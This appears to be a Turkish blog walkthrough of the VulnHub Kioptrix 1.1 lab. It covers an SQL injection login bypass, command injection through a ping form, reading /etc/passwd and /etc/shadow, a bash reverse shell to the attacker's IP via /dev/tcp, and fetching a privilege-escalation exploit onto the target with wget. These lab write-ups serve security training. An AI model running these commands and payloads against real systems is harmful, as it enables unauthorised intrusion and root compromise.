@@ -1,0 +1,124 @@
+---  
+layout: post
+title: Kioptrix1.1#2 Walkthrough
+Date: '2017-4-21 00:10 +0300'
+categories: blog
+---  
+
+Arkadaşlar merhaba;
+
+Bu yazımda [VulnHub](https://www.vulnhub.com) üzerinde yayınlanmış olan Kioptrix1.1#2 sanal makinasının çözümünü anlatmaya çalışacağım.
+
+__Linkler__
+	
+[Resmi sitesi](http://www.kioptrix.com)  
+[Vulnhub Bağlantısı](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)  
+
+__Çözüm__
+
+İlk olarak benim kullandığım VMware’de Kali’mi ve Kioptrix’i ayaklandırıyorum. Tabi ki de yapacağım ilk işlem hedef makinamın IP adresini bulmak olacak. Bunun için ilk önce Kali makinamın IP adresini buluyorum.  
+```
+$ ifconfig
+```
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/1.png)
+
+Daha sonra Kali’min bulunduğu scope taki IP’leri tarayarak devam ediyorum.  
+```
+$ netdiscover -i eth0 -r 192.168.1.0/24
+```
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/2.png)
+
+Ve gördüğümüz gibi IP adresim geldi😊 IP adresimi bulduktan sonra yapacağımız şey hemen bir nmap taraması yapmak olacak ki açık portlardan zafiyet bulabilecek miyim kontrol etmeliyim.  
+```	
+$ nmap -sS -sV 192.168.1.22
+```  
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/3.png)
+
+Gördüğümüz gibi açık 6 adet port bulunmakta. Burada hemen 80 portunda çalışan HTTP servisi dikkatimi çekiyor ve tarayıcımdan hedef makinanın IP adresini girerek web sitesinde ne var ona bakıyorum.  
+
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/4.png)
+
+Ve karşıma bir admin paneli geliyor. MySQL servisi kullanıldığını da bildiğim için (3306 portu) hemen sql injection denemesi yapıyorum 😊
+Bu noktada sayfanın arka planda aşağıdaki gibi bir SQL Query kullandığını düşünerek  
+```
+SELECT * FROM users WHERE username='' AND password=''
+```
+Aşağıdaki sql injection kodunu username ve password bölümlerine girerek ,  
+```	
+1’ or ‘1’=’1
+```
+Sorguyu aşağıdaki şekle getirmeyi amaçlıyorum:  
+
+```
+SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' or '1'='1'
+```
+Eğer tahminim doğruysa basitçe username 1 ise veya 1=1 ise ve password de 1 veya 1=1 ise beni içeri al demiş oluyorum😊 ki herkesin bildiği gibi 1=1 her zaman doğrudur ve sorguyu bu şekilde bypass etmiş olurum.  
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/5.png)
+
+Mükemmel!  Sorguyu aştık.😊 Karşıma ping atmak için bir komut paneli geldi. Kendi hostuma ping atarak deniyorum.  
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/6.png)
+
+Evet ping komutu doğru çalışıyor ve gelen sayfadan gördüğüm üzere (url’ye bakabilirsiniz /pingit.php) sayfa php kodları ile çalışıyor. Ben de hemen bir ; koyarak bypass denemesi yapıyorum.  
+```
+$ whoami
+```
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/7.png)
+
+Oldu! 😊 Sistem komutlarını çalıştırabildiğimi görüyorum ve ilk önce parolaları bulabileceğim /etc/passwd ve /etc/shadow dosyalarını okumaya çalışıyorum.  
+
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/8.png)
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/9.png)
+
+Resimlerden görüldüğü üzere /etc/shadow dosyasını okuyamıyorum. Başka bir yol denemem lazım.  
+Ben de Reverse Shell almayı deniyorum.   
+İlk önce netcat ile 443 portumu dinlemeye açıyorum.  
+```
+$ nc -nvlp 443
+``` 
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/10.png)
+
+Daha sonra reverse Shell almak için pentestmonkey.net sitesinden bash shellini alıyorum ve kendime göre düzenleyip sitedeki ping command promptuma yazıyorum.  
+```
+$ bash -i >& /dev/tcp/192.168.1.22/443 0>&1 (Buradaki ip adresi kalimin IP adresi ve port da dinlemeye açtığım port.)
+```
+Submit butonuna bastığımda hedef makinaya bağlantı sağlandığını ve yetkisiz bir Shell ile komut çalıştırabildiğimi görüyorum 😊  
+
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/11.png)
+
+Şimdi yapmam gereken yetki yükseltip sistemde root olmaya çalışmak. Aşağıdaki komutları çalıştırarak hedef makinamın hangi işletim sistemini kullandığını ve versiyon bilgilerini öğreniyorum.  
+```
+$  cat /etc/*-release
+```
+```
+$  cat /proc/version
+```
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/12.png)
+
+Versiyon bilgilerini de öğrendiğime göre internette ufak bir Google search ile bu Linux versiyonunda yetki yükseltme sağlayan https://www.exploit-db.com/exploits/9542/ bu exploiti buluyorum. Şimdi exploitimi kendi Kali’me indirip hedef makinaya kendi Kali’mden wget ile çekiyorum.
+Bunu yapmak için indirdiğim exploiti kendi Kali’mde /var/www/html dosyasına atıp apache servisimi başlatıyorum ki wget ile ulaşabileceğim internete açık bir sunucu olsun.  
+```
+$ service apache2 start ( Bunu kendi Kali’mde yapıyorum. )
+```
+```
+$ cd /tmp ( tmp dizinine geçiyorum ki dosya yazıp okuyabileceğim bir yer olmalı. Bunu hedef makinada yapıyorum exploiti çekeceğim yer burası olacak. )
+```
+```
+$ wget http://192.168.1.23/9542.c ( Bunu Shell ile ulaştığım hedef makinada yapıyorum. )
+```
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/13.png)
+
+Şimdi hedef makinaya yüklediğim exploit kodu C dilinde yazılmış olduğu için GCC ile compile ediyorum ve kodumu çalıştırıyorum. ( Artık exploiti hedef makinaya çektiğim için GCC ile compile ve kodu çalıştırma işlemlerimi hedef makina üzerinde yapıyorum. )  
+```
+$ gcc 9542.c 
+```
+```
+$ ./a.out
+```
+Daha sonra `whoami` komutu çalıştırdığımda sistemde artık root olduğumuzu görebiliriz.  
+```
+$ whoami
+```
+![]({{ AUCyberClub.github.io }}/assets/img/kioptrix1_1-2/14.png)
+
+---  
+[Talha Eryaşar](https://twitter.com/talha_eryasar)
